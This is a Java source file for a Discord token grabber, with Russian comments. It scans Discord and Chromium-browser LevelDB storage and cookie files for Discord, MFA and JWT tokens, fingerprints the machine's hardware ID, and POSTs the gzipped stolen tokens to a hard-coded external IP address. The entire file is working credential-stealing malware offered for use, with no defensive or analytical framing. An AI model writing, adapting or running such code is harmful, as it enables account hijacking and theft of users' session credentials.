import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.regex.*;
import java.net.*;
import java.util.zip.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.security.MessageDigest;

public class TokenExtractor {
    private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final String OUTPUT_DIR = TEMP_DIR + "\\extracted";
    private static final String SERVER_URL = "http://26.184.88.227:8891/upload_tokens";
    
    // Паттерны для поиска токенов (как в лучших грабберах)
    private static final String[] TOKEN_PATTERNS = {
        // Discord основной токен
        "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}",
        // Discord MFA токен
        "mfa\\.[\\w-]{84}",
        // Discord OAuth2
        "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}_[\\w-]{6}",
        // Discord токены из разных версий
        "([a-z0-9-]{36}\\.[a-z0-9-]{6}\\.[a-z0-9-]{27})",
        // Токены доступа (общие)
        "[A-Za-z0-9_\\-]{50,}",
        // JWT токены
        "eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{20,}\\.[A-Za-z0-9_-]{20,}"
    };
    
    // Пути для поиска LevelDB (все возможные)
    private static final String[][] SEARCH_PATHS = {
        {"APPDATA", "discord", "Local Storage", "leveldb"},
        {"APPDATA", "discordptb", "Local Storage", "leveldb"},
        {"APPDATA", "discordcanary", "Local Storage", "leveldb"},
        {"LOCALAPPDATA", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"},
        {"LOCALAPPDATA", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"},
        {"LOCALAPPDATA", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"},
        {"LOCALAPPDATA", "Opera Software", "Opera Stable", "Local Storage", "leveldb"},
        {"APPDATA", "discord", "Local Storage", "leveldb"},
        {"USERPROFILE", "AppData", "Roaming", "discord", "Local Storage", "leveldb"}
    };
    
    // Ключ для XOR расшифровки (часто используется в грабберах)
    private static final byte[] XOR_KEY = "SwillWay2025Key42".getBytes();
    private static final byte[] XOR_KEY2 = "DiscordTokenGrabber2025".getBytes();
    
    private static Set<String> foundTokens = new LinkedHashSet<>();
    private static Set<String> foundMFATokens = new LinkedHashSet<>();
    private static List<String> processedFiles = new ArrayList<>();
    private static String hwid = getHWID();
    private static int totalFilesScanned = 0;
    private static long totalBytesScanned = 0;
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[TokenExtractor][" + timestamp + "] " + msg);
    }
    
    private static void logSuccess(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[TokenExtractor][" + timestamp + "] ✅ " + msg);
    }
    
    private static void logError(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[TokenExtractor][" + timestamp + "] ❌ " + msg);
    }
    
    public static void main(String[] args) {
        log("=== Discord Token Extractor v4.0 ===");
        log("HWID: " + hwid);
        log("Server: " + SERVER_URL);
        
        // Создаём директории
        new File(TEMP_DIR).mkdirs();
        new File(OUTPUT_DIR).mkdirs();
        
        // Основной поиск
        findTokensInLevelDB();
        
        // Поиск в других местах
        findTokensInBrowserData();
        
        // Поиск в памяти процессов (если есть права)
        findTokensInProcessMemory();
        
        // Результаты
        printResults();
        
        // Отправка на сервер
        sendToServer();
        
        // Сохранение локально
        saveLocal();
        
        logSuccess("TokenExtractor finished. Found " + foundTokens.size() + " tokens");
    }
    
    // ==================== ОСНОВНОЙ ПОИСК В LEVELDB ====================
    
    private static void findTokensInLevelDB() {
        log("Scanning LevelDB directories...");
        
        for (String[] pathParts : SEARCH_PATHS) {
            String path = buildPath(pathParts);
            if (path == null) continue;
            
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                log("Found: " + path);
                scanLevelDBDirectory(dir);
            } else {
                log("Not found: " + path);
            }
        }
    }
    
    private static String buildPath(String[] parts) {
        StringBuilder sb = new StringBuilder();
        for (String part : parts) {
            String envValue = System.getenv(part);
            if (envValue != null) {
                sb.append(envValue);
            } else if (part.equals("USERPROFILE")) {
                sb.append(System.getProperty("user.home"));
            } else {
                sb.append(part);
            }
            sb.append(File.separator);
        }
        String path = sb.toString();
        return path.endsWith(File.separator) ? path.substring(0, path.length() - 1) : path;
    }
    
    private static void scanLevelDBDirectory(File dir) {
        File[] files = dir.listFiles((d, n) -> 
            n.endsWith(".log") || n.endsWith(".ldb") || n.endsWith(".log.old"));
        
        if (files == null || files.length == 0) {
            log("No LevelDB files in " + dir.getPath());
            return;
        }
        
        log("Found " + files.length + " LevelDB file(s) in " + dir.getName());
        
        for (File f : files) {
            scanFile(f);
        }
    }
    
    // ==================== СКАНИРОВАНИЕ ФАЙЛА ====================
    
    private static void scanFile(File file) {
        if (processedFiles.contains(file.getAbsolutePath())) return;
        processedFiles.add(file.getAbsolutePath());
        totalFilesScanned++;
        
        try {
            byte[] rawData = Files.readAllBytes(file.toPath());
            totalBytesScanned += rawData.length;
            
            // Метод 1: Прямой поиск в сырых данных
            searchInRawData(rawData, file.getName());
            
            // Метод 2: Поиск в строковом представлении
            String content = new String(rawData);
            searchInString(content, file.getName());
            
            // Метод 3: XOR расшифровка с разными ключами
            byte[] xorDecrypted = xorDecrypt(rawData, XOR_KEY);
            searchInRawData(xorDecrypted, file.getName() + "[XOR1]");
            
            byte[] xorDecrypted2 = xorDecrypt(rawData, XOR_KEY2);
            searchInRawData(xorDecrypted2, file.getName() + "[XOR2]");
            
            // Метод 4: Поиск по байтовым паттернам (шестнадцатеричный поиск)
            searchHexPatterns(rawData, file.getName());
            
            log("Scanned: " + file.getName() + " (" + rawData.length + " bytes)");
            
        } catch (Exception e) {
            logError("Error scanning " + file.getName() + ": " + e.getMessage());
        }
    }
    
    // ==================== МЕТОДЫ ПОИСКА ====================
    
    private static void searchInRawData(byte[] data, String source) {
        String text = new String(data);
        searchInString(text, source);
    }
    
    private static void searchInString(String text, String source) {
        for (String pattern : TOKEN_PATTERNS) {
            Pattern p = Pattern.compile(pattern);
            Matcher m = p.matcher(text);
            while (m.find()) {
                String token = m.group();
                if (isValidToken(token)) {
                    if (token.startsWith("mfa")) {
                        foundMFATokens.add(token);
                        logSuccess("MFA Token found in " + source + ": " + maskToken(token));
                    } else {
                        foundTokens.add(token);
                        logSuccess("Token found in " + source + ": " + maskToken(token));
                    }
                }
            }
        }
    }
    
    private static void searchHexPatterns(byte[] data, String source) {
        // Поиск по HEX-паттернам, характерным для токенов
        String hex = bytesToHex(data);
        
        // Discord токены в HEX: длина около 150-200 символов
        Pattern hexPattern = Pattern.compile("([0-9A-F]{100,200})");
        Matcher m = hexPattern.matcher(hex);
        while (m.find()) {
            String hexStr = m.group();
            try {
                byte[] bytes = hexToBytes(hexStr);
                String possibleToken = new String(bytes);
                if (isValidToken(possibleToken)) {
                    foundTokens.add(possibleToken);
                    logSuccess("Token found (HEX) in " + source + ": " + maskToken(possibleToken));
                }
            } catch (Exception e) {}
        }
    }
    
    // ==================== ПОИСК В ДРУГИХ МЕСТАХ ====================
    
    private static void findTokensInBrowserData() {
        log("Searching in browser data...");
        
        // Chrome/Edge Cookies
        String[] browserCookiePaths = {
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies",
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
            System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies"
        };
        
        for (String path : browserCookiePaths) {
            if (path != null) {
                File f = new File(path);
                if (f.exists()) {
                    log("Found browser cookies: " + path);
                    scanFile(f);
                }
            }
        }
        
        // Local Storage папки
        String[] localStoragePaths = {
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"
        };
        
        for (String path : localStoragePaths) {
            if (path != null) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    scanLevelDBDirectory(dir);
                }
            }
        }
    }
    
    private static void findTokensInProcessMemory() {
        // Попытка найти токены в памяти процесса Discord
        try {
            Process p = Runtime.getRuntime().exec("tasklist /FI \"IMAGENAME eq Discord.exe\" /NH");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("Discord.exe")) {
                    log("Discord process found, trying to read memory...");
                    // В чистой Java нет прямого доступа к памяти других процессов
                    // Но можно оставить для будущей интеграции с JNI
                }
            }
            r.close();
        } catch (Exception e) {}
    }
    
    // ==================== ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ====================
    
    private static byte[] xorDecrypt(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
    
    private static boolean isValidToken(String token) {
        if (token == null) return false;
        if (token.length() < 50) return false;
        if (token.length() > 200) return false;
        if (token.contains(" ")) return false;
        if (token.contains("\n")) return false;
        if (token.contains("\r")) return false;
        if (token.contains("\t")) return false;
        if (token.contains("{")) return false;
        if (token.contains("}")) return false;
        if (token.contains("[")) return false;
        if (token.contains("]")) return false;
        if (token.contains("<")) return false;
        if (token.contains(">")) return false;
        if (token.equalsIgnoreCase("null")) return false;
        if (token.equalsIgnoreCase("undefined")) return false;
        if (token.matches(".*[а-яА-Я].*")) return false;
        return true;
    }
    
    private static String maskToken(String token) {
        if (token.length() <= 20) return token;
        return token.substring(0, 15) + "..." + token.substring(token.length() - 5);
    }
    
    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02X", b));
        }
        return sb.toString();
    }
    
    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }
    
    // ==================== ВЫВОД РЕЗУЛЬТАТОВ ====================
    
    private static void printResults() {
        log("");
        log("========== SCAN RESULTS ==========");
        log("Files scanned: " + totalFilesScanned);
        log("Data scanned: " + (totalBytesScanned / 1024) + " KB");
        log("Regular tokens found: " + foundTokens.size());
        log("MFA tokens found: " + foundMFATokens.size());
        log("==================================");
        
        if (!foundTokens.isEmpty()) {
            log("");
            log("Regular tokens:");
            for (String token : foundTokens) {
                log("  " + maskToken(token));
            }
        }
        
        if (!foundMFATokens.isEmpty()) {
            log("");
            log("MFA tokens:");
            for (String token : foundMFATokens) {
                log("  " + maskToken(token));
            }
        }
        log("");
    }
    
    // ==================== ОТПРАВКА НА СЕРВЕР ====================
    
    private static void sendToServer() {
        if (foundTokens.isEmpty() && foundMFATokens.isEmpty()) {
            log("No tokens to send");
            return;
        }
        
        log("Sending tokens to server...");
        HttpURLConnection conn = null;
        
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("HWID: ").append(hwid).append("\n");
            sb.append("Timestamp: ").append(LocalDateTime.now()).append("\n");
            sb.append("Files scanned: ").append(totalFilesScanned).append("\n");
            sb.append("Regular tokens: ").append(foundTokens.size()).append("\n");
            sb.append("MFA tokens: ").append(foundMFATokens.size()).append("\n");
            sb.append("\n");
            
            sb.append("=== REGULAR TOKENS ===\n");
            for (String token : foundTokens) {
                sb.append(token).append("\n");
            }
            
            sb.append("\n=== MFA TOKENS ===\n");
            for (String token : foundMFATokens) {
                sb.append(token).append("\n");
            }
            
            String payload = sb.toString();
            byte[] compressed = compress(payload);
            
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.setRequestProperty("Content-Type", "text/plain");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            
            int code = conn.getResponseCode();
            if (code == 200) {
                logSuccess("Tokens sent successfully!");
            } else {
                logError("Server response: HTTP " + code);
            }
            
        } catch (Exception e) {
            logError("Send error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    private static void saveLocal() {
        try {
            if (!foundTokens.isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (String token : foundTokens) {
                    sb.append(token).append("\n");
                }
                Files.write(Paths.get(OUTPUT_DIR + "\\tokens.txt"), sb.toString().getBytes());
                log("Tokens saved to: " + OUTPUT_DIR + "\\tokens.txt");
            }
            
            if (!foundMFATokens.isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (String token : foundMFATokens) {
                    sb.append(token).append("\n");
                }
                Files.write(Paths.get(OUTPUT_DIR + "\\mfa_tokens.txt"), sb.toString().getBytes());
                log("MFA tokens saved to: " + OUTPUT_DIR + "\\mfa_tokens.txt");
            }
            
            // Сохраняем отчёт
            String report = "HWID: " + hwid + "\n"
                          + "Date: " + LocalDateTime.now() + "\n"
                          + "Files scanned: " + totalFilesScanned + "\n"
                          + "Tokens found: " + foundTokens.size() + "\n"
                          + "MFA tokens: " + foundMFATokens.size();
            Files.write(Paths.get(OUTPUT_DIR + "\\report.txt"), report.getBytes());
            
        } catch (Exception e) {
            logError("Local save error: " + e.getMessage());
        }
    }
    
    private static byte[] compress(String str) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(bos);
        gzip.write(str.getBytes());
        gzip.close();
        return bos.toByteArray();
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("-")) {
                    return line.trim();
                }
            }
            r.close();
        } catch (Exception e) {}
        
        try {
            Process p = Runtime.getRuntime().exec("wmic diskdrive get serialnumber");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.trim().length() > 5 && !line.contains("SerialNumber")) {
                    return "HDD_" + line.trim();
                }
            }
            r.close();
        } catch (Exception e) {}
        
        return "UNKNOWN_" + System.getProperty("user.name");
    }
}
